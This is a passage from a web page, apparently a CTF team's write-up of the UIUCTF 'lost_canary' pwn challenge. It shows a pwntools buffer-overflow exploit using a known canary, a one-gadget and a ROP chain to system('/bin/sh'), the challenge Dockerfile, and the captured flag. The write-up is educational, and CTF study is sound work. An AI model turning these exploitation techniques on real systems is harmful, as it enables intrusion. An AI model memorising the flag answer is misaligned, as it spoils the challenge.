</span></span><span style="display:flex;"><span>constraints:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>r15<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> r15 <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> r15 is a valid argv
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>rdx<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> rdx <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> rdx is a valid envp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>0xe3b04 execve<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>, rsi, rdx<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>constraints:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>rsi<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> rsi <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> rsi is a valid argv
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>rdx<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> rdx <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> rdx is a valid envp
</span></span></code></pre></div><p>If this list does not feature enough one gadgets, we can get a longer list by increasing the level (e.g. <code>-l 10</code>). In this case, we already have a match: The second entry in the list fullfills our conditions.</p>
<p>So lets build the remaining part of the exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>rop_chain <span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe3b01</span>) <span style="color:#75715e"># one_gadget with rdx &amp; r15 == NULL</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># buffer + canary + base pointer + return address</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;eY iEuas&#34;</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> rop_chain
</span></span><span style="display:flex;"><span><span style="color:#75715e"># overflow buffer</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter ticket code:&#34;</span>, payload)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># get the flag by hand</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="rop-chain">ROP chain<a href="#rop-chain" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>With our ROP chain, we want to call <code>system(&quot;/bin/sh&quot;)</code>. As a result, we need to set <code>rdi</code>, the register for the first argument, to a pointer to <code>/bin/sh</code> and call <code>system</code>. Getting the string <code>/bin/sh</code> is no problem, since libc needs it interally for <code>system</code>. Furthermore the address of system can easily optained by pwntools. Pwntools also provides <code>p64</code>, a function to pack an integer into 8 bytes in the endianess needed by our application. The only common problem with ROP chains are instructions operating on <code>xmm</code> registers. Those registers are 128 bit wide and their instructions require the stack to be aligned to 16 byte. As a consequence of lots of functions, including <code>system</code> using them, we have to align the stack correctly. This can be achieved by a <code>ret</code> gadget, as it simply pops a return address from the stack and doesn&rsquo;t change something else, i.e. a <code>ret</code> gadget is some sort of <code>nop</code> for ROP. The rest of the procedure is identical to the one gadget case.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># find a set of rop gadgets</span>
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(libc)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># build rop chain</span>
</span></span><span style="display:flex;"><span>rop_chain <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># prepare first argument</span>
</span></span><span style="display:flex;"><span>rop_chain <span style="color:#f92672">+=</span> p64(rop<span style="color:#f92672">.</span>rdi<span style="color:#f92672">.</span>address)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># set it to /bin/sh, this is a string in libc as it is needed for system</span>
</span></span><span style="display:flex;"><span>rop_chain <span style="color:#f92672">+=</span> p64(next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>)))
</span></span><span style="display:flex;"><span><span style="color:#75715e"># correctly align stack</span>
</span></span><span style="display:flex;"><span>rop_chain <span style="color:#f92672">+=</span> p64(rop<span style="color:#f92672">.</span>ret<span style="color:#f92672">.</span>address)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># call system</span>
</span></span><span style="display:flex;"><span>rop_chain <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>symbols<span style="color:#f92672">.</span>system)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># buffer + canary + base pointer + rop chain</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;eY iEuas&#34;</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> rop_chain
</span></span><span style="display:flex;"><span><span style="color:#75715e"># stack:</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">eY iEuas
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">pop rdi; ret
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">-&gt; /bin/sh
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ret
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">system
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span></code></pre></div><h2 id="flag">Flag<a href="#flag" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>If we now run the exploit, we get a shell.</p>
<p>By examining the Dockerfile, we can locate the flag at <code>/flag.txt</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Dockerfile" data-lang="Dockerfile"><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> ubuntu:20.04 as chroot</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> gcr.io/kctf-docker/challenge@sha256:eb0f8c3b97460335f9820732a42702c2fa368f7d121a671c618b45bbeeadab28</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> --from<span style="color:#f92672">=</span>chroot / /chroot<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> mkdir -p /chroot/home/user<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> ./lost_canary /chroot/home/user<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> ./flag.txt /chroot/<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> nsjail.cfg /home/user/<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">CMD</span> kctf_setup <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>   kctf_drop_privs <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  socat <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>     TCP-LISTEN:1337,reuseaddr,fork <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>     EXEC:<span style="color:#e6db74">&#34;kctf_pow nsjail --config /home/user/nsjail.cfg -- /home/user/lost_canary&#34;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>The <code>/chroot/</code> at the beginning of the path is consumed by the nsjail of kctf, which effectively sets <code>/chroot/</code> as our root folder (<code>/</code>).</p>
<p>As a result, we can receive the flag, by using <code>cat</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat /flag.txt
</span></span><span style="display:flex;"><span>uiuctf<span style="color:#f92672">{</span>the_average_sigpwny_transit_experience<span style="color:#f92672">}</span>
</span></span></code></pre></div>
      </div></div>

  
  
<div class="pagination">
    <div class="pagination__title">
        <span class="pagination__title-h">Read other posts</span>
        <hr />
    </div>
    <div class="pagination__buttons">
        
        
        <span class="button next">
            <a href="/posts/hackasat4-magic-space-bussin/">
                <span class="button__text">Hack-A-Sat 4: Magic Space Bussin</span>
                <span class="button__icon">→</span>
            </a>
        </span>
        
    </div>
</div>

  

  

</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">
        <span>© 2021-2024 CyberTaskForce Zero</span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>







  
</div>

</body>
</html>
